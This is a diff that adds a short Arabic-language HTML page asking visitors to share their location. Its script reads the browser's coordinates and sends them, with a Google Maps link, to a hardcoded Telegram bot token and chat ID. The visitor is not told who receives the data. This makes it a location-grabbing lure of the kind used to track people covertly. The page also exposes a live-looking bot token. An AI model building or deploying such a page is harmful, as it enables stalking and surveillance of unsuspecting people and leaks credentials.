@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديد موقعك</title>
+</head>
+<body>
+    <h2>يرجى الموافقة على مشاركة موقعك</h2>
+    <button onclick="getLocation()">مشاركة الموقع</button>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("المتصفح لا يدعم تحديد الموقع.");
+            }
+        }
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let botToken = "7923151425:AAFInzECazr-2eyok7i4se6RrBV2CeP5v4c";
+            let chatId = "7326032837";  // استبدلها بالـ chat ID الخاص بك
+
+            let googleMapsLink = https://www.google.com/maps?q=${lat},${lon};
+            let message = 📍 موقع جديد تم استلامه:\n\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 Google Maps: ${googleMapsLink};
+
+            let url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+
+            fetch(url).then(response => alert("تم إرسال الموقع!"));
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("تم رفض طلب الموقع.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("الموقع غير متاح.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة تحديد الموقع.");
+                    break;
+                default:
+                    alert("حدث خطأ غير معروف.");
+            }
+        }
+    </script>
+</body>
+</html>
